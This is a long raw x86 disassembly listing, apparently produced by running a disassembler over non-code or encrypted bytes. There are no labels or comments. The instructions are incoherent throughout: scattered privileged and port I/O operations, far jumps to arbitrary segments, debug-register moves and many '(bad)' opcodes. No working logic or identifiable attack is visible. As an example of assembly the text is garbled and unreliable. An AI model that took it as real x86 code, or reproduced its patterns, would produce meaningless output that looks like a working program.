  420308:	xor    ecx,eax
  42030a:	inc    edi
  42030b:	mov    cs,WORD PTR [esi]
  42030d:	xchg   BYTE PTR [esi-0x5e6705ba],bh
  420313:	stc    
  420314:	cmp    edi,esp
  420316:	sbb    al,0x4
  420318:	js     0x420380
  42031a:	jge    0x420334
  42031c:	mov    bl,0xd9
  42031e:	outs   dx,BYTE PTR ds:[esi]
  42031f:	inc    edx
  420320:	js     0x42032b
  420322:	pop    eax
  420323:	inc    ebp
  420324:	std    
  420325:	addr16 push es
  420327:	add    edx,DWORD PTR [ebx+0x6f4665d9]
  42032d:	imul   edx,ebp,0x353f01cc
  420333:	push   ebx
  420334:	mov    bh,0x21
  420336:	adc    eax,0x7d124369
  42033b:	lahf   
  42033c:	pop    esi
  42033d:	into   
  42033e:	mov    edx,0xe8cb8c64
  420343:	jbe    0x42033d
  420345:	sub    ah,bh
  420347:	push   edx
  420348:	xchg   DWORD PTR ss:[ecx],edx
  42034b:	jp     0x42038f
  42034d:	imul   eax,DWORD PTR [ecx],0x64
  420350:	adc    esi,ebx
  420352:	hlt    
  420353:	pop    edi
  420354:	retf   0xd985
  420357:	out    0x21,al
  420359:	mov    esp,0xe6f3df2a
  42035e:	outs   dx,DWORD PTR ds:[esi]
  42035f:	idiv   DWORD PTR [ecx]
  420361:	repnz sbb ecx,ecx
  420364:	dec    ebp
  420365:	aad    0xa5
  420367:	fbstp  TBYTE PTR [edi+0x5e]
  42036a:	into   
  42036b:	imul   ebx,DWORD PTR [edx-0x13be70b4],0xffffffad
  420372:	iret   
  420373:	pop    es
  420374:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420375:	push   ecx
  420376:	jp     0x420336
  420378:	mov    ecx,0x8da299ee
  42037d:	jmp    0x4f32:0x40201e7d
  420384:	mov    edi,0xf64d7191
  420389:	push   ds
  42038a:	push   ss
  42038b:	cmp    ebx,DWORD PTR [ecx]
  42038d:	sar    BYTE PTR [ecx-0x20],1
  420390:	cwde   
  420391:	sub    eax,0xa5d55655
  420396:	int3   
  420397:	inc    ebx
  420398:	out    0xc2,eax
  42039a:	int    0xa6
  42039c:	jmp    0x892b2ea5
  4203a1:	jle    0x420419
  4203a3:	pop    edi
  4203a4:	xchg   edi,eax
  4203a5:	shr    BYTE PTR ds:0x5e2e4b19,cl
  4203ab:	lds    edx,FWORD PTR [eax]
  4203ad:	cmp    BYTE PTR [edx*8-0x37c037e5],ah
  4203b4:	fs cwde 
  4203b6:	push   esp
  4203b7:	xlat   BYTE PTR ds:[ebx]
  4203b8:	adc    DWORD PTR [edi-0x7add6fd0],ebp
  4203be:	scas   eax,DWORD PTR es:[edi]
  4203bf:	imul   edx,edi,0x19
  4203c2:	sub    ebx,DWORD PTR [ecx-0x17060dc9]
  4203c8:	lock sbb al,0xf2
  4203cb:	lods   eax,DWORD PTR ds:[esi]
  4203cc:	lds    ecx,FWORD PTR [esi+0x50b4700a]
  4203d2:	pop    ecx
  4203d3:	add    BYTE PTR [ecx],dl
  4203d5:	retf   0x674
  4203d8:	mov    dl,0x11
  4203da:	imul   ebx,DWORD PTR [ebx+edi*2-0x74],0x50ea1385
  4203e2:	xor    al,0xda
  4203e4:	dec    eax
  4203e5:	jmp    0x9dc14baa
  4203ea:	sbb    al,0xfc
  4203ec:	xor    al,0x14
  4203ee:	test   dl,ch
  4203f0:	jl     0x4203a9
  4203f2:	add    dh,ch
  4203f4:	test   al,0xfc
  4203f6:	lock out dx,al
  4203f8:	dec    edi
  4203f9:	adc    al,0xce
  4203fb:	fst    QWORD PTR [ebx]
  4203fd:	mov    edx,0xde8e4315
  420402:	je     0x4203f6
  420404:	es call 0x464042a1
  42040a:	mov    dl,0x8b
  42040c:	sub    DWORD PTR [esi],0xecdc86cd
  420412:	or     BYTE PTR [ebx+eiz*1],ch
  420415:	or     eax,0x15283611
  42041a:	sbb    al,0xcc
  42041c:	bound  edx,QWORD PTR [edi+0x3e25502d]
  420422:	clc    
  420423:	arpl   dx,bp
  420425:	pop    es
  420426:	fstp   TBYTE PTR [ebx+0x2fc7667d]
  42042c:	mov    eax,ds:0x16ee49bc
  420431:	fisubr WORD PTR [ecx]
  420433:	mov    bh,0xfe
  420435:	xchg   edx,eax
  420436:	xchg   esp,eax
  420437:	ret    0xc889
  42043a:	daa    
  42043b:	cmp    al,0xa9
  42043d:	lahf   
  42043e:	or     ah,dl
  420440:	retf   0xb707
  420443:	fstp   QWORD PTR [ecx+0x7a]
  420446:	adc    DWORD PTR [edi+0x2fb253bd],edi
  42044c:	adc    cl,bl
  42044e:	push   cs
  42044f:	fisttp DWORD PTR [ecx]
  420451:	and    edx,esi
  420453:	(bad)  
  420454:	xor    al,BYTE PTR [ebp+0x38]
  420457:	fstp   QWORD PTR [ecx-0x57993900]
  42045d:	in     eax,dx
  42045e:	dec    ecx
  42045f:	lods   eax,DWORD PTR ds:[esi]
  420460:	jmp    0x42047c
  420462:	jb     0x420482
  420464:	hlt    
  420465:	push   0x66
  420467:	jae    0x4204a3
  420469:	inc    eax
  42046a:	push   0x3df099b0
  42046f:	xor    al,0x58
  420471:	adc    DWORD PTR [eax+edx*4+0x3],edx
  420475:	hlt    
  420476:	and    BYTE PTR [edi+0x7a40cc1b],0xd
  42047d:	rol    DWORD PTR [edi+0x4a435136],cl
  420483:	push   eax
  420484:	jg     0x42046d
  420486:	and    al,0xb
  420488:	jb     0x4204c0
  42048a:	outs   dx,DWORD PTR ds:[esi]
  42048b:	hlt    
  42048c:	outs   dx,DWORD PTR ds:[esi]
  42048d:	xchg   ebx,eax
  42048e:	mov    al,0xe8
  420490:	rcr    DWORD PTR [ecx+0x448ee336],1
  420496:	addr16 out dx,al
  420498:	dec    ecx
  420499:	sti    
  42049a:	push   ss
  42049b:	inc    ebp
  42049c:	or     ah,0xd6
  42049f:	icebp  
  4204a0:	adc    BYTE PTR [ecx],cl
  4204a2:	xchg   ecx,eax
  4204a3:	push   0xbf078417
  4204a8:	sub    al,0x22
  4204aa:	xor    eax,DWORD PTR [ebp+0x102715e3]
  4204b0:	pop    ebx
  4204b1:	ins    BYTE PTR es:[edi],dx
  4204b2:	push   cx
  4204b4:	cmp    al,0xaf
  4204b6:	sub    BYTE PTR [edx+0x1bdb0d5f],bh
  4204bc:	add    DWORD PTR [esi-0x61acb8c1],esp
  4204c2:	loop   0x4204d2
  4204c4:	mov    ah,0xa
  4204c6:	out    0xfd,eax
  4204c8:	xchg   DWORD PTR [eax],ebx
  4204ca:	arpl   cx,dx
  4204cc:	jmp    0x3a1d:0x9581d46c
  4204d3:	sub    edi,DWORD PTR [esi+0x68fd6a5f]
  4204d9:	pop    ecx
  4204da:	push   eax
  4204db:	int3   
  4204dc:	call   0xa657e103
  4204e1:	sub    al,BYTE PTR [edx-0x49]
  4204e4:	retf   
  4204e5:	mov    dl,0xcf
  4204e7:	mov    dh,0xbd
  4204e9:	mov    ebp,DWORD PTR ds:0x9802b40d
  4204ef:	or     eax,0x4bb55d43
  4204f4:	and    al,0xa6
  4204f6:	and    BYTE PTR [ebx-0x2d],ch
  4204f9:	add    eax,0xe7748eac
  4204fe:	or     esp,DWORD PTR [esi-0x1b]
  420501:	int3   
  420502:	sub    esp,DWORD PTR [ecx-0x72]
  420505:	mov    bl,0xfb
  420507:	mul    DWORD PTR [eax+0x2eb6ad76]
  42050d:	bnd ret 
  42050f:	int3   
  420510:	test   eax,0x17ada765
  420515:	or     ch,BYTE PTR [ebp+0x6832d399]
  42051b:	pop    edi
  42051c:	in     eax,0xa2
  42051e:	shl    BYTE PTR [edx+ebx*1-0x1b],cl
  420522:	out    dx,al
  420523:	mov    dh,0xac
  420525:	bound  edi,QWORD PTR [ebx-0x17df58b5]
  42052b:	add    DWORD PTR [edi+0xd],0x7cd123fa
  420532:	shl    BYTE PTR [edx],cl
  420534:	xchg   esi,eax
  420535:	mov    ah,0xda
  420537:	dec    esi
  420538:	std    
  420539:	mov    ch,BYTE PTR [ebp+ecx*4+0x2a]
  42053d:	sti    
  42053e:	adc    eax,0x42248ed0
  420543:	div    ch
  420545:	sbb    BYTE PTR [esi+eax*1+0x33f73873],dl
  42054c:	inc    edx
  42054d:	jp     0x420506
  42054f:	dec    eax
  420550:	or     bh,BYTE PTR [esp+edx*2]
  420553:	ins    DWORD PTR es:[edi],dx
  420554:	xor    esi,esp
  420556:	adc    eax,0xceda0ca4
  42055b:	(bad)  [edi-0x7f]
  42055e:	imul   ebp,DWORD PTR [ebx+eax*2]
  420562:	xor    edi,DWORD PTR [esi-0x59]
  420565:	mov    ch,0x5a
  420567:	test   BYTE PTR [eax-0x63a86f51],0x2e
  42056e:	sbb    al,BYTE PTR [edx-0x57]
  420571:	hlt    
  420572:	adc    al,BYTE PTR [eax+0x682c733d]
  420578:	lods   eax,DWORD PTR ds:[esi]
  420579:	stos   BYTE PTR es:[edi],al
  42057a:	jmp    0x42050b
  42057c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42057d:	not    edx
  42057f:	mov    esp,0xa0d4b66c
  420584:	sub    al,0x54
  420586:	mov    edi,0x2205cb72
  42058b:	loopne 0x420567
  42058d:	jecxz  0x42057a
  42058f:	mov    ds:0x683c943f,al
  420594:	idiv   BYTE PTR [eax+0x64563e64]
  42059a:	push   eax
  42059b:	mov    BYTE PTR ds:[ebx+0x56f2dccf],bl
  4205a2:	sub    DWORD PTR [ebp-0x1f48eabe],eax
  4205a8:	int    0x78
  4205aa:	push   ss
  4205ab:	inc    edx
  4205ac:	adc    eax,0x9aff291d
  4205b1:	pop    ebx
  4205b2:	pusha  
  4205b3:	icebp  
  4205b4:	push   DWORD PTR [ecx-0x39]
  4205b7:	jne    0x4205fd
  4205b9:	mov    bl,0x1d
  4205bb:	adc    esi,eax
  4205bd:	ret    
  4205be:	or     al,0x9b
  4205c0:	mov    ebx,0x5cfdb5b4
  4205c5:	or     DWORD PTR [ebp-0x72],esi
  4205c8:	sbb    BYTE PTR [ebx+0x69],ah
  4205cb:	lds    edi,FWORD PTR [edi-0x3]
  4205ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205cf:	add    al,0x8e
  4205d1:	scas   eax,DWORD PTR es:[edi]
  4205d2:	aaa    
  4205d3:	mov    edi,0xaa9f631e
  4205d8:	ja     0x4205c2
  4205da:	push   ebp
  4205db:	es mov esi,0xaa22f224
  4205e1:	(bad)  [ebp-0x73]
  4205e4:	cld    
  4205e5:	adc    al,0xc9
  4205e7:	mov    ch,0xa2
  4205e9:	in     eax,0x7
  4205eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205ec:	test   BYTE PTR [edx+0x11],cl
  4205ef:	in     al,0x7b
  4205f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205f2:	pop    ecx
  4205f3:	out    dx,al
  4205f4:	push   0x8d2da5e7
  4205f9:	fnstenv [ebx]
  4205fb:	stos   DWORD PTR es:[edi],eax
  4205fc:	add    DWORD PTR [ebp+0x18],esi
  4205ff:	cmp    edi,DWORD PTR es:[ebp+ebx*8-0x35]
  420604:	mov    DWORD PTR [edx+0x36a06400],edi
  42060a:	xchg   DWORD PTR [edi],ebp
  42060c:	inc    ecx
  42060d:	js     0x4205f2
  42060f:	jnp    0x4205b4
  420611:	(bad)  
  420612:	pusha  
  420613:	ins    BYTE PTR es:[edi],dx
  420614:	out    0xa8,eax
  420616:	popa   
  420617:	inc    esi
  420618:	mov    edx,0x13d2cc33
  42061d:	xor    al,0x40
  42061f:	pushf  
  420620:	sti    
  420621:	in     eax,dx
  420622:	shr    DWORD PTR es:[ecx],0x36
  420626:	xchg   BYTE PTR [ebp+0x163c6166],al
  42062c:	into   
  42062d:	retf   
  42062e:	cld    
  42062f:	fcom   QWORD PTR [ebx-0x940198c]
  420635:	dec    ebp
  420636:	dec    ecx
  420637:	add    ah,bh
  420639:	out    dx,eax
  42063a:	fst    QWORD PTR [eax]
  42063c:	shr    bh,1
  42063e:	mov    ds:0x8c51ff8e,eax
  420643:	les    ebx,FWORD PTR [ebp-0x70a0872a]
  420649:	xchg   ebx,eax
  42064a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42064b:	out    dx,eax
  42064c:	into   
  42064d:	or     BYTE PTR [ebp+edx*2+0x1b],cl
  420651:	and    BYTE PTR [edx],0xcb
  420654:	and    DWORD PTR [edx+0x140cf327],ebx
  42065a:	inc    ebp
  42065b:	cs cmc 
  42065d:	les    eax,FWORD PTR [edx]
  42065f:	pop    ds
  420660:	xor    BYTE PTR [ebp-0x78177920],dl
  420666:	cmp    esp,DWORD PTR [edi]
  420668:	push   ecx
  420669:	dec    esi
  42066a:	and    eax,0x481d17bd
  42066f:	pop    ebx
  420670:	das    
  420671:	add    al,0x78
  420673:	fiadd  WORD PTR [eax-0x41]
  420676:	call   0xa5c1:0x306ca8e7
  42067d:	sbb    ah,BYTE PTR [ecx]
  42067f:	std    
  420680:	xchg   edi,eax
  420681:	imul   esi,DWORD PTR [ebp-0x25ad15af],0x7e5768eb
  42068b:	shl    BYTE PTR [ebx],1
  42068d:	shl    edi,cl
  42068f:	add    BYTE PTR [esi],ah
  420691:	xor    DWORD PTR [eax-0x3211e4bf],ecx
  420697:	pop    DWORD PTR [ebx-0x49a93051]
  42069d:	in     eax,0x3e
  42069f:	mov    esi,0x8f865478
  4206a4:	dec    ebx
  4206a5:	mov    ah,0x72
  4206a7:	test   al,0x23
  4206a9:	stos   DWORD PTR es:[edi],eax
  4206aa:	mov    db6,ebp
  4206ad:	outs   dx,BYTE PTR ds:[esi]
  4206ae:	(bad)  
  4206af:	in     eax,0xdb
  4206b1:	add    DWORD PTR [esi-0xe354f66],0x47
  4206b8:	hlt    
  4206b9:	(bad)  
  4206bb:	mov    dl,BYTE PTR [ebp+0x9]
  4206be:	mov    ch,0x3
  4206c0:	loopne 0x420714
  4206c2:	imul   esp,DWORD PTR [edi+0x15aeec71],0x47
  4206c9:	cli    
  4206ca:	and    eax,0x16bf15bb
  4206cf:	shl    cl,cl
  4206d1:	xchg   esp,eax
  4206d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206d3:	ret    0x2d58
  4206d6:	jbe    0x420662
  4206d8:	sbb    eax,0xe13843c3
  4206dd:	outs   dx,BYTE PTR ds:[esi]
  4206de:	jg     0x4206de
  4206e0:	test   eax,0x37686452
  4206e5:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206e7:	mov    ecx,0x9c928271
  4206ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206ed:	mov    bl,0x13
  4206ef:	bound  ebx,QWORD PTR [edx]
  4206f1:	scas   al,BYTE PTR es:[edi]
  4206f2:	fcmovne st,st(2)
  4206f4:	out    dx,eax
  4206f5:	mov    eax,ds:0xf982e48a
  4206fa:	popf   
  4206fb:	ins    BYTE PTR es:[edi],dx
  4206fc:	cli    
  4206fd:	fwait
  4206fe:	shl    DWORD PTR [eax-0x7c],cl
  420701:	jmp    0x5afccd6b
  420706:	mov    ecx,edx
  420708:	fsub   DWORD PTR [ecx+0x1f]
  42070b:	xchg   ebp,eax
  42070c:	stos   DWORD PTR es:[edi],eax
  42070d:	inc    eax
  42070e:	repnz lods eax,DWORD PTR ds:[esi]
  420710:	(bad)  
  420711:	sahf   
  420712:	sbb    BYTE PTR [eax-0x38],dh
  420715:	jge    0x420764
  420717:	jecxz  0x4206dd
  420719:	mov    ch,0x81
  42071b:	bound  ebp,QWORD PTR [ecx+0x37]
  42071e:	arpl   WORD PTR [edx+ecx*4-0x28],si
  420722:	pop    ebx
  420723:	stc    
  420724:	xchg   edx,eax
  420725:	and    bh,BYTE PTR [ecx-0x42]
  420728:	and    al,0x7f
  42072a:	stos   DWORD PTR es:[edi],eax
  42072b:	cli    
  42072c:	out    dx,eax
  42072d:	loopne 0x42070b
  42072f:	mov    ds:0x49a16e96,al
  420734:	call   0xc9437e4
  420739:	scas   al,BYTE PTR es:[edi]
  42073a:	mov    dh,0xce
  42073c:	or     edi,DWORD PTR [edi+0x5]
  42073f:	push   ds
  420740:	sub    al,0x95
  420742:	adc    eax,0xf0885f25
  420747:	inc    esi
  420748:	pusha  
  420749:	nop
  42074a:	jecxz  0x420788
  42074c:	ja     0x4206e8
  42074e:	sbb    DWORD PTR fs:[ecx],eax
  420751:	and    eax,0x735059be
  420756:	xchg   edi,eax
  420757:	push   eax
  420758:	cmp    ch,BYTE PTR [edi]
  42075a:	cmp    al,0x8e
  42075c:	push   0x7d
  42075e:	scas   al,BYTE PTR es:[edi]
  42075f:	cli    
  420760:	(bad)  
  420761:	mov    dh,0xe
  420763:	mov    ecx,DWORD PTR [esi]
  420765:	fist   WORD PTR [ecx-0x30]
  420768:	pushf  
  420769:	push   eax
  42076a:	scas   al,BYTE PTR es:[edi]
  42076b:	data16 stos BYTE PTR es:[edi],al
  42076d:	mov    eax,ds:0x2d70ca70
  420772:	imul   ebp,edi,0xd6a1d350
  420778:	inc    ecx
  420779:	add    ebp,ecx
  42077b:	mov    DWORD PTR [edx],0x50aef91
  420781:	or     BYTE PTR [eax-0x30],ch
  420784:	out    0xb7,al
  420786:	mov    edx,0x5009ff4e
  42078b:	jo     0x42079f
  42078d:	jmp    0x420801
  42078f:	mov    al,ds:0x9f1ca015
  420794:	inc    eax
  420795:	pop    ecx
  420796:	xor    DWORD PTR [ecx+0xe139de5],ecx
  42079c:	jno    0x42074c
  42079e:	push   esi
  42079f:	xchg   DWORD PTR [ebx+0x30],edi
  4207a2:	dec    ecx
  4207a3:	mov    esi,0x4b2d66a1
  4207a8:	pop    ss
  4207a9:	mov    ebx,0x3e256801
  4207ae:	mov    dh,bl
  4207b0:	sbb    bl,ch
  4207b2:	jmp    0xdcd5:0x9068ba5e
  4207b9:	into   
  4207ba:	adc    esi,DWORD PTR [ecx]
  4207bc:	mov    esp,0x20ccd1e5
  4207c1:	push   cs
  4207c2:	mov    cl,0x4
  4207c4:	mov    eax,0x15e34666
  4207c9:	jne    0x420802
  4207cb:	sbb    eax,0xbffdc5a3
  4207d0:	push   es
  4207d1:	and    esi,ecx
  4207d3:	jecxz  0x4207d6
  4207d5:	rol    DWORD PTR [ebx],cl
  4207d7:	out    dx,eax
  4207d8:	test   BYTE PTR [edx],dh
  4207da:	mov    ebp,0xa0234b18
  4207df:	jne    0x4207fb
  4207e1:	sub    al,0xdd
  4207e3:	je     0x42078c
  4207e5:	mov    dh,0x9d
  4207e7:	and    BYTE PTR [edi+0x70],0xf9
  4207eb:	ror    BYTE PTR [esi],cl
  4207ed:	arpl   WORD PTR [ebx-0x59],ax
  4207f0:	sti    
  4207f1:	in     al,0x75
  4207f3:	mov    al,0xa
  4207f5:	adc    dl,BYTE PTR [ecx-0x2510b7cf]
  4207fb:	xchg   esp,eax
  4207fc:	adc    ah,dh
  4207fe:	enter  0xda72,0x21
  420802:	cmp    eax,DWORD PTR [esi]
  420804:	or     eax,0xefc7aa28
  420809:	sub    al,0xdf
  42080b:	dec    esp
  42080c:	cs in  eax,0x36
  42080f:	or     DWORD PTR [ebx],eax
  420811:	idiv   BYTE PTR [edx]
  420813:	dec    ecx
  420814:	jbe    0x42080f
  420816:	retf   0x139b
  420819:	repz sub eax,0x18bb2631
  42081f:	sti    
  420820:	ret    0xaf6d
  420823:	xor    eax,0xbe1caf83
  420828:	pop    ecx
  420829:	data16 mov bl,0xa2
  42082c:	inc    edi
  42082d:	popf   
  42082e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42082f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420830:	das    
  420831:	xchg   ebx,eax
  420832:	addr16 add al,0x94
  420835:	mov    ds:0x3fadad20,eax
  42083a:	adc    DWORD PTR [ebx+eiz*1-0x92c7b9],ecx
  420841:	into   
  420842:	push   cs
  420843:	mov    cl,bh
  420845:	inc    eax
  420846:	pop    eax
  420847:	push   edx
  420848:	aad    0xee
  42084a:	int3   
  42084b:	sub    DWORD PTR [esi-0x23],eax
  42084e:	fsubrp st(2),st
  420850:	lock mov esi,0x615e34af
  420856:	push   ds
  420857:	or     bh,BYTE PTR [edx]
  420859:	inc    ecx
  42085a:	xchg   esp,eax
  42085b:	xchg   ebx,eax
  42085c:	lahf   
  42085d:	mov    cl,0x30
  42085f:	sub    eax,0xa91cd03a
  420864:	jmp    0x4208c8
  420866:	xor    ebp,DWORD PTR [ebx+0x6b9b865a]
  42086c:	sub    dh,0x4a
  42086f:	das    
  420870:	sahf   
  420871:	mov    bh,0x3b
  420873:	xor    al,0x19
  420875:	mov    ch,BYTE PTR [edx]
  420877:	mov    dl,0x42
  420879:	cs inc esi
  42087b:	pusha  
  42087c:	les    eax,FWORD PTR [eax]
  42087e:	test   DWORD PTR [edi],edx
  420880:	inc    ebx
  420881:	push   0x22186223
  420886:	jecxz  0x42089f
  420888:	es loope 0x42087e
  42088b:	cli    
  42088c:	xchg   esi,eax
  42088d:	call   0xb152:0xc1b447b1
  420894:	dec    edx
  420895:	pop    esp
  420896:	inc    edi
  420897:	mov    DWORD PTR [ebx],ebp
  420899:	into   
  42089a:	pop    ebp
  42089b:	mov    dl,0xe4
  42089d:	and    dh,BYTE PTR [ebx]
  42089f:	ret    
  4208a0:	rol    DWORD PTR [ebx-0x127bd184],1
  4208a6:	(bad)  
  4208a7:	pop    ebp
  4208a8:	sti    
  4208a9:	popf   
  4208aa:	stos   DWORD PTR es:[edi],eax
  4208ab:	fidivr DWORD PTR [ebx+0xafb8dc6]
  4208b1:	or     cl,ah
  4208b3:	lds    edx,FWORD PTR [ecx+0x719ae032]
  4208b9:	(bad)  
  4208ba:	cmp    ebx,eax
  4208bc:	call   0x4a503850
  4208c1:	repz and DWORD PTR [esi-0x75],esp
  4208c5:	mov    esi,0x512a2e87
  4208ca:	push   es
  4208cb:	test   al,0x80
  4208cd:	jmp    0x4208e1
  4208cf:	mov    ebx,0xdf7084bb
  4208d4:	fcmovnu st,st(7)
  4208d6:	xor    al,0x36
  4208d8:	or     bl,bl
  4208da:	dec    eax
  4208db:	fisttp DWORD PTR [eax+ebp*4-0x4e]
  4208df:	out    dx,eax
  4208e0:	test   al,0xfe
  4208e2:	or     eax,0x867fc9d7
  4208e7:	mov    esp,0x9db35afa
  4208ec:	das    
  4208ed:	sub    eax,0x9908d952
  4208f2:	xor    di,WORD PTR [ecx-0x205ba03f]
  4208f9:	push   es
  4208fa:	add    al,0xbe
  4208fc:	test   BYTE PTR [edx],bl
  4208fe:	push   es
  4208ff:	mov    al,0x49
  420901:	lea    ecx,[edx+0x600edf02]
  420907:	xchg   dl,al
  420909:	cmc    
  42090a:	sbb    esp,DWORD PTR [esi+0xe]
  42090d:	enter  0x30e3,0x9d
  420911:	inc    ebp
  420912:	not    BYTE PTR [esi+0x4a]
  420915:	sub    BYTE PTR [edx-0x66],bh
  420918:	inc    ebx
  420919:	pop    es
  42091a:	lods   eax,DWORD PTR ds:[esi]
  42091b:	in     al,dx
  42091c:	sahf   
  42091d:	and    BYTE PTR [eax+0x1c397aab],0x30
  420924:	pop    esi
  420925:	cli    
  420926:	push   0x6e
  420928:	add    ah,BYTE PTR [ebx-0x3f]
  42092b:	mov    dh,0xfd
  42092d:	xor    bh,dl
  42092f:	xchg   ebp,eax
  420930:	xchg   ecx,eax
  420931:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420932:	rol    DWORD PTR [eax+0x204b0b5c],cl
  420938:	xlat   BYTE PTR ds:[ebx]
  420939:	test   eax,0x9bc01eb6
  42093e:	loop   0x4209b7
  420940:	push   cs
  420941:	out    dx,al
  420942:	sub    al,0x45
  420944:	ins    DWORD PTR es:[edi],dx
  420945:	xchg   BYTE PTR [eax-0x38],bh
  420948:	sbb    eax,0x18a1e887
  42094d:	leave  
  42094e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42094f:	dec    edx
  420950:	mov    ah,0x34
  420952:	mov    DWORD PTR [ecx+0x8],edi
  420955:	inc    ebx
  420956:	(bad)  [esi]
  420958:	(bad)  
  420959:	scas   al,BYTE PTR es:[edi]
  42095a:	(bad)  
  42095b:	cmp    eax,0xb11c11ac
  420960:	adc    dh,BYTE PTR [esi-0x406d245]
  420966:	addr16 mov ds:0xcad9,eax
  42096a:	daa    
  42096b:	or     ch,ah
  42096d:	add    bh,BYTE PTR [eax-0x588189ed]
  420973:	ds add eax,0x83768c48
  420979:	gs (bad) gs:[edx+ecx*8]
  42097e:	lahf   
  42097f:	jmp    0x4afcbca0
  420984:	add    ebx,DWORD PTR [edi-0x7b108ada]
  42098a:	(bad)  
  42098b:	sub    ecx,esi
  42098d:	mov    dl,0x41
  42098f:	xchg   ebp,eax
  420990:	mov    bh,0x3b
  420992:	or     eax,0x284685fd
  420997:	or     bh,dh
  420999:	fadd   st,st(0)
  42099b:	xor    eax,0xb3931d31
  4209a0:	shl    DWORD PTR [edx+edi*8],1
  4209a3:	sub    cl,BYTE PTR [esi-0xa]
  4209a6:	fs push es
  4209a8:	ret    
  4209a9:	dec    ebp
  4209aa:	push   ecx
  4209ab:	sbb    al,0xb1
  4209ad:	inc    ebp
  4209ae:	pushaw 
  4209b0:	test   DWORD PTR ds:0x3d6afeb2,0x1537d17d
  4209ba:	addr16 xchg ecx,ebx
  4209bd:	jo     0x4209d6
  4209bf:	or     al,0x7b
  4209c1:	inc    edx
  4209c2:	sti    
  4209c3:	and    al,BYTE PTR [ebp+esi*1+0x3c]
  4209c7:	sub    DWORD PTR [eax],eax
  4209c9:	sub    dl,dl
  4209cb:	fbld   TBYTE PTR [ecx+ebp*4+0x56]
  4209cf:	call   0xf502:0xdb911dbf
  4209d6:	and    ebp,DWORD PTR [ecx]
  4209d8:	aas    
  4209d9:	mov    bh,0xcf
  4209db:	inc    ebp
  4209dc:	mov    fs,WORD PTR [edi+0x4c]
  4209df:	out    0x5c,al
  4209e1:	push   esi
  4209e2:	inc    eax
  4209e3:	ds lock pop ss
  4209e6:	and    BYTE PTR [esi],0xf
  4209e9:	inc    eax
  4209ea:	push   ds
  4209eb:	sub    ch,BYTE PTR [esi]
  4209ed:	xchg   ecx,eax
  4209ee:	pop    ecx
  4209ef:	call   0xb213:0x8f166569
  4209f6:	mov    dh,0x44
  4209f8:	jmp    0x4209ed
  4209fa:	call   0x7e89:0x30ba644a
  420a01:	inc    edx
  420a02:	out    dx,eax
  420a03:	jmp    0xa00e:0xdbe7f81e
  420a0a:	dec    esp
  420a0b:	sar    BYTE PTR [esi+0x51],cl
  420a0e:	(bad)  
  420a0f:	int3   
  420a10:	mov    esi,esi
  420a12:	pop    edi
  420a13:	pop    ss
  420a14:	mov    eax,0x7fa402c
  420a19:	fstp   DWORD PTR [edi-0xc]
  420a1c:	pop    esi
  420a1d:	in     eax,dx
  420a1e:	jno    0x4209b2
  420a20:	adc    ch,BYTE PTR [ebx+0x30]
  420a23:	in     eax,0x35
  420a25:	or     ebx,DWORD PTR [eax-0x5b]
  420a28:	adc    ebx,DWORD PTR [ebx+0x4516c7d2]
  420a2e:	push   0xffffffca
  420a30:	or     edi,esp
  420a32:	dec    ch
  420a34:	aad    0x4
  420a36:	push   0x53
  420a38:	ds imul edi,ecx,0xffffffa3
  420a3c:	aaa    
  420a3d:	sbb    BYTE PTR [edx+0x51],al
  420a40:	mov    ah,0x11
  420a42:	sbb    DWORD PTR [eax+0x4b],0xb753300c
  420a49:	cmp    al,0xc4
  420a4b:	add    ah,BYTE PTR [esi-0x3891f2ca]
  420a51:	push   0xffffffe8
  420a53:	test   BYTE PTR [edx-0x4a21e059],bl
  420a59:	push   esi
  420a5a:	cmp    ecx,DWORD PTR [esi]
  420a5c:	xor    eax,0x747c16d2
  420a61:	and    DWORD PTR [edi-0x4d],ebp
  420a64:	jno    0x420acc
  420a66:	call   0x1e2d:0xe1deaa23
  420a6d:	xchg   DWORD PTR [edi],ecx
  420a6f:	mov    BYTE PTR [edi],bl
  420a71:	in     eax,dx
  420a72:	je     0x420a26
  420a74:	cmp    eax,0xecf65c54
  420a79:	xchg   edx,eax
  420a7a:	idiv   ecx
  420a7c:	jns    0x420a8a
  420a7e:	dec    edx
  420a7f:	xchg   ebx,eax
  420a80:	add    eax,0x28ecbfdd
  420a85:	push   edx
  420a86:	cs jle 0x420a0b
  420a89:	icebp  
  420a8a:	mov    ch,0x13
  420a8c:	pop    ss
  420a8d:	jl     0x420a3f
  420a8f:	outs   dx,DWORD PTR ds:[esi]
  420a90:	push   ebp
  420a91:	lods   al,BYTE PTR ds:[esi]
  420a92:	pop    edx
  420a93:	cmc    
  420a94:	cmp    cl,ah
  420a96:	mov    eax,0xee564220
  420a9b:	mov    dh,0x69
  420a9d:	xchg   esp,eax
  420a9e:	pop    edx
  420a9f:	pop    esi
  420aa0:	jae    0x420aba
  420aa2:	push   ebp
  420aa3:	xchg   edi,eax
  420aa4:	adc    BYTE PTR [ebp+0x9a600a7],0xbb
  420aab:	out    0xbf,al
  420aad:	lods   al,BYTE PTR ds:[esi]
  420aae:	xchg   ebx,eax
  420aaf:	out    dx,al
  420ab0:	fld    DWORD PTR [edx+0x3cc8b66e]
  420ab6:	(bad)  
  420ab7:	mov    eax,0xdb8424e3
  420abc:	sub    DWORD PTR [ecx+ecx*1+0x0],ebp
  420ac0:	jne    0x420a78
  420ac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ac3:	xchg   ebp,eax
  420ac4:	ret    
  420ac5:	mov    eax,ds:0x6426745d
  420aca:	fnstcw WORD PTR [ecx-0x3d]
  420acd:	pop    ecx
  420ace:	out    0xb0,eax
  420ad0:	les    ecx,FWORD PTR [esi-0x7f]
  420ad3:	add    DWORD PTR [ebx+0x3a7794d3],ebp
